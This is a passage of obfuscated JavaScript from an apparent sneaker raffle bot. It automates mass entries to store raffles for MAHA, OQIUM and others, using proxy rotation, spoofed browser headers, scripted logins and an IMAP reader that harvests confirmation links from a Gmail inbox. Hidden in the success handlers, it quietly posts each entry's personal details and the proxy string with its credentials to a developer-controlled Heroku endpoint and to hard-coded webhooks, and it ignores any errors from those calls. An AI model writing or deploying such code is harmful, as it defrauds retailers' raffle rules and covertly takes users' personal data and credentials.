                            console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x14135c['waitForSelector']('#username'), await _0x14135c['type']('#username', _0x1c9b59[_0xb1ccd4]['Email']), await _0x14135c['waitForSelector']('#password'), await _0x14135c['type']('#password', _0x1c9b59[_0xb1ccd4]['Password']), await _0xfa5357(0x190), await _0x14135c['click']('#buttonSubmit'), await _0x14135c['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1c9b59[_0xb1ccd4]['Size']);
                            let _0x63a103 = _0x1c9b59[_0xb1ccd4]['Size']['replace']('.5', '\x201/2');
                            if (_0x63a103['toUpperCase']() == 'RANDOM') {
                                const _0x44ce22 = await _0x14135c['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x45deb5 = Math['round'](Math['random']() * (_0x44ce22['length'] - 0x1));
                                await _0x44ce22[_0x45deb5]['click']();
                            } else
                                await _0x14135c['click']('button[aria-label=\x22' + _0x63a103 + '\x22]');
                            await _0xfa5357(0x1f4);
                            try {
                                await _0x14135c['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xfa5357(0x12c), console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x14135c['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_firstName', _0x1c9b59[_0xb1ccd4]['FirstName']), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_lastName', _0x1c9b59[_0xb1ccd4]['LastName']), await _0xfa5357(0x12c), await _0x14135c['select']('#dwfrm_raffle_addressFields_country', _0x1c9b59[_0xb1ccd4]['Country']), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_city', _0x1c9b59[_0xb1ccd4]['City']), await _0xfa5357(0x12c);
                            _0x1c9b59[_0xb1ccd4]['Postcode'] == undefined && (_0x1c9b59[_0xb1ccd4]['Postcode'] = _0x1c9b59[_0xb1ccd4]['Zip']);
                            await _0x14135c['type']('#dwfrm_raffle_addressFields_postalCode', _0x1c9b59[_0xb1ccd4]['Postcode']), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_address1', _0x1c9b59[_0xb1ccd4]['Address1']), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_address2', _0x1c9b59[_0xb1ccd4]['HouseNumber']), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x1c9b59[_0xb1ccd4]['Address2']), await _0xfa5357(0x12c), await _0x14135c['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xfa5357(0x12c), await _0x14135c['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x1c9b59[_0xb1ccd4]['Follower']), await _0xfa5357(0x1f4), await _0x14135c['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20' + _0x34d98c['blue']('Awaiting\x20Paypal\x20Payment')), await _0x14135c['click']('.b-paypal_button');
                            try {
                                await _0x14135c['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x1dd997 = 'no', _0x253d32(_0x1c9b59[_0xb1ccd4], _0x31be13), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x57b1f2['succesDEVMSG']);
                                await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x57b1f2['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x57b1f2['succesPUBMSG']);
                                let _0x3ead23 = _0x1c9b59[_0xb1ccd4];
                                try {
                                    prxdata = {
                                        'username': _0x4ee077['replace']('#', ''),
                                        'module': _0x31be13['name'],
                                        'entrydata': JSON['stringify'](_0x3ead23),
                                        'proxy': '' + _0x57a22c[_0xb1ccd4]
                                    };
                                    var _0x134784 = JSON['stringify'](prxdata);
                                    let _0x3c1419 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x134784, _0x3c1419);
                                } catch (_0x5c4efa) {
                                }
                            } catch (_0x89cae4) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x89cae4)), _0x129dcc = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x89cae4;
                                var _0x485559 = await _0xc964cf(_0x1c9b59[_0xb1ccd4], _0x31be13, 'dev', !![], _0x129dcc);
                                _0x57b1f2['errorDEV'] = { 'embeds': [_0x485559] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x57b1f2['errorDEV']), await _0x33437b(_0x5e1645, _0x57b1f2['errorDEV']);
                            }
                        } catch (_0x48c972) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20' + _0x48c972)), _0x129dcc = '' + _0x48c972;
                            var _0x485559 = await _0xc964cf(_0x1c9b59[_0xb1ccd4], _0x31be13, 'dev', !![], _0x129dcc);
                            _0x57b1f2['errorDEV'] = { 'embeds': [_0x485559] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x57b1f2['errorDEV']), await _0x33437b(_0x5e1645, _0x57b1f2['errorDEV']), _0x1dd997 = 'yes';
                        } finally {
                            _0x19b4ca && _0x19b4ca['close']();
                            if (_0x1dd997 == 'yes' && _0x4e7f0a != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4e7f0a + '\x20/\x205)')), _0xb1ccd4 = _0xb1ccd4 - 0x1, _0x4e7f0a = _0x4e7f0a + 0x1;
                                continue;
                            }
                            _0x1dd997 == 'yes' && _0x4e7f0a >= 0x5 && (_0x3003c7(_0x1c9b59[_0xb1ccd4], _0x31be13), _0x1dd997 = 'no', _0x4e7f0a = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['AfewDelay'] + '\x20ms'), await _0xfa5357(_0x50b722['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x183f81, _0x2dfb3b, _0x33d6f9) {
                    for (var _0x2bf274 = 0x0; _0x2bf274 < _0x2dfb3b['length']; _0x2bf274++) {
                        try {
                            await _0x559c6d(_0x2dfb3b, _0x2bf274);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x528229(_0x9edd58, _0x45651b, _0x3cdd15, _0x2a5234, _0x567378) {
                            var _0x50d22c, _0x1da34e = {}, _0x5278a4 = [], _0x4e7963 = {}, _0x275a07 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1b133d = Math['round'](Math['random']() * (_0x275a07['length'] - 0x1));
                            !_0x2a5234 && (_0x2a5234 = {});
                            if (_0x45651b != 'ver') {
                                _0x3b7620(_0x3cdd15['name'] + '\x20Task\x20' + (_0x9edd58 + 0x1) + '\x20/\x20' + _0x2a5234['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851), await _0x559c6d(_0x2a5234, _0x9edd58), _0x1da34e = _0x3cdd15['data'], _0x1da34e['data']['attributes']['email'] = '' + _0x2a5234[_0x9edd58]['Email'];
                                if (_0x2a5234[_0x9edd58]['Size'] == 'RANDOM') {
                                }
                                _0x1da34e['data']['attributes']['properties']['$first_name'] = '' + _0x2a5234[_0x9edd58]['FirstName'], _0x1da34e['data']['attributes']['properties']['$last_name'] = '' + _0x2a5234[_0x9edd58]['LastName'], _0x1da34e['data']['attributes']['properties']['$address1'] = _0x2a5234[_0x9edd58]['Address1'] + '\x20' + _0x2a5234[_0x9edd58]['Address2'] + '\x20' + _0x2a5234[_0x9edd58]['HouseNumber'], _0x1da34e['data']['attributes']['properties']['$zip'] = '' + _0x2a5234[_0x9edd58]['Zip'], _0x1da34e['data']['attributes']['properties']['$city'] = '' + _0x2a5234[_0x9edd58]['City'], _0x1da34e['data']['attributes']['properties']['$country'] = '' + _0x2a5234[_0x9edd58]['Country'], _0x2a5234[_0x9edd58]['Size'] == 'RANDOM' ? _0x1da34e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x275a07[_0x1b133d] : _0x1da34e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2a5234[_0x9edd58]['Size'], _0x1da34e['data']['attributes']['properties']['$phone_number'] = '' + _0x2a5234[_0x9edd58]['Phone'], _0x1da34e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2a5234[_0x9edd58]['Follower'];
                            }
                            if (_0x50b722['useRandomProxy'] = ![])
                                var _0x440422 = _0x567378[_0x9edd58]['split'](':');
                            else
                                var _0x2872cf = Math['round'](Math['random']() * (_0x567378['length'] - 0x1)), _0x440422 = _0x567378[_0x2872cf]['split'](':');
                            var _0x414392 = {
                                'jar': _0x15c37f,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3cdd15['url'],
                                'headers': _0x3cdd15['headers'],
                                'body': JSON['stringify'](_0x1da34e),
                                'proxy': 'http://' + _0x440422[0x2] + ':' + _0x440422[0x3] + '@' + _0x440422[0x0] + ':' + _0x440422[0x1]
                            };
                            return _0x45651b != 'ver' && (_0x414392['url'] = _0x3cdd15['url'], _0x414392['headers'] = _0x3cdd15['headers']), _0x45651b == 'ver' && (_0x414392['method'] = 'GET'), new Promise(function (_0x217205, _0x43d4e4) {
                                callback = async (_0x94acc3, _0x45c19b, _0xbbf203) => {
                                    if (!_0x94acc3 && _0x45c19b['statusCode'] == 0xca || !_0x94acc3 && _0x45c19b['statusCode'] == 0xc8) {
                                        if (_0x45651b != 'ver') {
                                            var _0x5df85e = await _0xc964cf(_0x2a5234[_0x9edd58], _0x3cdd15, 'dev', ![]), _0x4e7c70 = await _0xc964cf(_0x2a5234[_0x9edd58], _0x3cdd15, 'pub', ![]);
                                            const _0xfaa695 = {
                                                'succesDEVMSG': { 'embeds': [_0x5df85e] },
                                                'succesPUBMSG': { 'embeds': [_0x4e7c70] }
                                            };
                                            let _0x126887 = _0x2a5234[_0x9edd58];
                                            try {
                                                prxdata = {
                                                    'username': _0x4ee077['replace']('#', ''),
                                                    'module': _0x3cdd15['name'],
                                                    'entrydata': JSON['stringify'](_0x126887),
                                                    'proxy': '' + _0x567378[_0x9edd58]
                                                };
                                                var _0x3e30c8 = JSON['stringify'](prxdata);
                                                let _0x4df58a = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x3e30c8, _0x4df58a);
                                            } catch (_0x49aa6c) {
                                            }
                                            if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                                try {
                                                    await _0x33437b(_0x50b722['webhook'], _0xfaa695['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0xfaa695['succesDEVMSG']), await _0xfa5357(0xc8);
                                            try {
                                                await _0x33437b(_0x471d14, _0xfaa695['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x253d32(_0x2a5234[_0x9edd58], _0x3cdd15);
                                        }
                                        _0x217205(console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x3cdd15['name'] + ']\x20Task\x20' + (_0x9edd58 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x45651b != 'ver') {
                                            var _0x4f3ac5 = '' + _0x94acc3, _0x54ba69 = await _0xc964cf(_0x2a5234[_0x9edd58], _0x3cdd15, 'dev', !![], _0x4f3ac5), _0x110ca4 = {};
                                            _0x110ca4['errorDEV'] = { 'embeds': [_0x54ba69] }, _0x3003c7(_0x2a5234[_0x9edd58], _0x3cdd15), _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x110ca4['errorDEV']), await _0x33437b(_0x5e1645, _0x110ca4['errorDEV']);
                                        }
                                        _0x43d4e4(console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x3cdd15['name'] + ']\x20Task\x20' + (_0x9edd58 + 0x1) + ':\x20' + _0x94acc3)));
                                    }
                                };
                                try {
                                    _0x45651b != 'ver' && console['log'](_0x391006() + '\x20[' + _0x3cdd15['name'] + ']\x20Task\x20' + (_0x9edd58 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1da34e['data']['attributes']['email']), _0x5b7593(_0x414392, callback);
                                } catch (_0x1f1893) {
                                    console['log'](_0x391006() + '\x20Task\x20' + (_0x9edd58 + 0x1) + ':\x20' + _0x1f1893);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x528229(_0x2bf274, 'nor', _0x183f81, _0x2dfb3b, _0x33d6f9), console['log'](_0x391006() + '\x20[' + _0x183f81['name'] + ']\x20Sleeping\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        } catch (_0xf37dcb) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1bfbb6, _0x17c460, _0x28d9f6) {
                    var _0x4432a9 = [], _0x20b02c = ![];
                    async function _0x41d007() {
                        var _0x48c7a1 = new _0x108c6b({
                            'user': _0x50b722['masterMail'],
                            'password': _0x50b722['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4d2783(_0x25ac8f) {
                            _0x48c7a1['openBox']('INBOX', ![], _0x25ac8f);
                        }
                        _0x48c7a1['once']('ready', function () {
                            _0x4d2783(function (_0x2a5503, _0x8289fe) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2a5503)
                                    throw _0x2a5503;
                                _0x48c7a1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x5385a8, _0x21a762) {
                                    if (!_0x21a762 || !_0x21a762['length'])
                                        console['log'](_0x391006() + '\x20[' + _0x1bfbb6['name'] + ']\x20No\x20mails\x20found'), _0x48c7a1['end']();
                                    else {
                                        var _0x38a3dd = _0x48c7a1['seq']['fetch'](_0x21a762, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x38a3dd['on']('message', function (_0x50f388, _0x1ba699) {
                                            var _0x3f9ec3 = '(#' + _0x1ba699 + ')\x20';
                                            _0x50f388['on']('body', function (_0x4206e5, _0x3346e0) {
                                                _0x2e7895(_0x4206e5, (_0x11d45c, _0x4e8dcd) => {
                                                    var _0x3d0b05 = _0x4e8dcd['text']['split']('(')[0x1], _0x31b517 = _0x3d0b05['split'](')')[0x0];
                                                    _0x4432a9['push'](_0x31b517);
                                                });
                                            }), _0x50f388['once']('end', function () {
                                            });
                                        }), _0x38a3dd['once']('error', function (_0xeb971f) {
                                            console['log']('Fetch\x20error:\x20' + _0xeb971f), _0x20b02c = !![];
                                        }), _0x38a3dd['once']('end', function () {
                                            _0x48c7a1['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x48c7a1['once']('error', function (_0x461324) {
                            console['log'](_0x34d98c['red'](_0x461324['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x20b02c = !![];
                        }), _0x48c7a1['once']('end', async function () {
                            _0x20b02c = !![];
                        }), _0x48c7a1['connect']();
                    }
                    async function _0x7bbac4(_0x29f1d5, _0x5b3e99, _0x481308) {
                        for (var _0x37c432 = 0x0; _0x37c432 < _0x5b3e99['length']; _0x37c432++) {
                            async function _0x59048f(_0x30ec9b, _0x19bac7, _0x65523, _0x2fc5b9, _0x4b1d52) {
                                var _0x25312d, _0x572f17 = {}, _0x568f36 = [], _0x55f970 = {}, _0x2860ca = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4d2142 = Math['round'](Math['random']() * (_0x2860ca['length'] - 0x1));
                                _0x2fc5b9[_0x30ec9b]['Size'] == 'RANDOM' && (_0x2fc5b9[_0x30ec9b]['Size'] = _0x2860ca[_0x4d2142]);
                                !_0x2fc5b9 && (_0x2fc5b9 = {});
                                if (_0x50b722['useRandomProxy'] = ![])
                                    var _0x1707a7 = _0x4b1d52[_0x30ec9b]['split'](':');
                                else
                                    var _0x4d051d = Math['round'](Math['random']() * (_0x4b1d52['length'] - 0x1)), _0x1707a7 = _0x4b1d52[_0x4d051d]['split'](':');
                                var _0x35e8b4 = {
                                    'jar': _0x15c37f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x65523['url'],
                                    'headers': _0x65523['headers'],
                                    'body': JSON['stringify'](_0x572f17),
                                    'proxy': 'http://' + _0x1707a7[0x2] + ':' + _0x1707a7[0x3] + '@' + _0x1707a7[0x0] + ':' + _0x1707a7[0x1]
                                };
                                return _0x19bac7 != 'ver' && (_0x35e8b4['url'] = _0x65523['url'], _0x35e8b4['headers'] = _0x65523['headers']), _0x19bac7 == 'ver' && (_0x35e8b4['method'] = 'GET', _0x35e8b4['url'] = _0x2fc5b9[_0x30ec9b]), new Promise(function (_0x3ab06b, _0x2c9992) {
                                    callback = async (_0x5e887c, _0x17cc9e, _0x22b8ea) => {
                                        if (!_0x5e887c && _0x17cc9e['statusCode'] == 0xca || !_0x5e887c && _0x17cc9e['statusCode'] == 0xc8) {
                                            if (_0x19bac7 != 'ver') {
                                                var _0x3d655c = await _0xc964cf(_0x2fc5b9[_0x30ec9b], _0x65523, 'dev', ![]), _0x3addaf = await _0xc964cf(_0x2fc5b9[_0x30ec9b], _0x65523, 'pub', ![]);
                                                const _0x3a54ad = {
                                                    'succesDEVMSG': { 'embeds': [_0x3d655c] },
                                                    'succesPUBMSG': { 'embeds': [_0x3addaf] }
                                                };
                                                if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                                    try {
                                                        await _0x33437b(_0x50b722['webhook'], _0x3a54ad['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x3a54ad['succesDEVMSG']), await _0xfa5357(0xc8);
                                                try {
                                                    await _0x33437b(_0x471d14, _0x3a54ad['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x253d32(_0x2fc5b9[_0x30ec9b], _0x65523);
                                            }
                                            _0x3ab06b(console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x65523['name'] + ']\x20Task\x20' + (_0x30ec9b + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x19bac7 != 'ver') {
                                                var _0x313fc8 = '' + _0x5e887c, _0x458a3e = await _0xc964cf(_0x2fc5b9[_0x30ec9b], _0x65523, 'dev', !![], _0x313fc8), _0x31d6c6 = {};
                                                _0x31d6c6['errorDEV'] = { 'embeds': [_0x458a3e] }, _0x3003c7(_0x2fc5b9[_0x30ec9b], _0x65523), _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x31d6c6['errorDEV']), await _0x33437b(_0x5e1645, _0x31d6c6['errorDEV']);
                                            }
                                            _0x2c9992(console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x65523['name'] + ']\x20Task\x20' + (_0x30ec9b + 0x1) + ':\x20' + _0x5e887c)));
                                        }
                                    };
                                    try {
                                        _0x19bac7 != 'ver' ? console['log'](_0x391006() + '\x20[' + _0x65523['name'] + ']\x20Task\x20' + (_0x30ec9b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x572f17['data']['attributes']['email']) : console['log'](_0x391006() + '\x20[' + _0x65523['name'] + ']\x20Task\x20' + (_0x30ec9b + 0x1) + ':\x20Fetching\x20Response'), _0x5b7593(_0x35e8b4, callback);
                                    } catch (_0x2d142b) {
                                        console['log'](_0x391006() + '\x20Task\x20' + (_0x30ec9b + 0x1) + ':\x20' + _0x2d142b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x59048f(_0x37c432, 'ver', _0x29f1d5, _0x5b3e99, _0x481308), console['log'](_0x391006() + '\x20[' + _0x29f1d5['name'] + ']\x20Sleeping\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                            } catch (_0x42121a) {
                            }
                        }
                    }
                    try {
                        _0x41d007();
                        while (!_0x20b02c) {
                            await _0xfa5357(0xbb8);
                        }
                        console['log']('Found\x20' + _0x4432a9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xfa5357(0x9c4);
                    }
                    await _0x7bbac4(_0x1bfbb6, _0x4432a9, _0x28d9f6);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x235928, _0x151c7c, _0x5f363c) {
                    for (var _0x23c471 = 0x0; _0x23c471 < _0x151c7c['length']; _0x23c471++) {
                        try {
                            await _0x559c6d(_0x151c7c, _0x23c471);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x24c607(_0x3fcad5, _0x18eda4, _0x3e1a07, _0x4c1ac5, _0x34dccc) {
                            var _0x41b960, _0x44be79 = {}, _0x355853 = [], _0x36b6d5 = {}, _0x157e8f = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1c6004 = Math['round'](Math['random']() * (_0x157e8f['length'] - 0x1));
                            !_0x4c1ac5 && (_0x4c1ac5 = {});
                            if (_0x18eda4 != 'ver') {
                                _0x3b7620(_0x3e1a07['name'] + '\x20Task\x20' + (_0x3fcad5 + 0x1) + '\x20/\x20' + _0x4c1ac5['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851), _0x355853 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x4ee077
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x4c1ac5[_0x3fcad5]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x50b722['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x1f5435
                                        }
                                    ]
                                }], _0x36b6d5 = { 'embeds': _0x355853 }, _0x44be79 = _0x3e1a07['data'], _0x44be79['data']['attributes']['email'] = '' + _0x4c1ac5[_0x3fcad5]['Email'];
